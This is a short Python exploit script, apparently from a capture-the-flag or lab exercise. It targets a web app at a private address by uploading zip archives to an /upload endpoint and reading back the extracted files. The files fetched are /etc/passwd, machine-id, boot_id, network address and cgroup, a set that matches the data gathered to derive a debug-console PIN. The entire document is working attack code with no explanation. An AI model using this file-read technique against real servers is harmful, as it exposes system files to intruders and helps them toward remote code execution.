import requests

url='http://192.168.145.128:8000'

def read(path):
    r=requests.get(url+path)
    print(r.text)

def up(file):
    zip_file = {'file': ('test.zip', open(file, 'rb').read())}
    r=requests.post(url+'/upload',files=zip_file).text
    # print(r)
    path=r.split("<a href='")[1].split("..")[0]
    return path+file.split('.')[0]

read(up('passwd.zip'))
read(up('machine-id.zip'))
read(up('boot_id.zip'))
read(up('address.zip'))
read(up('cgroup.zip'))

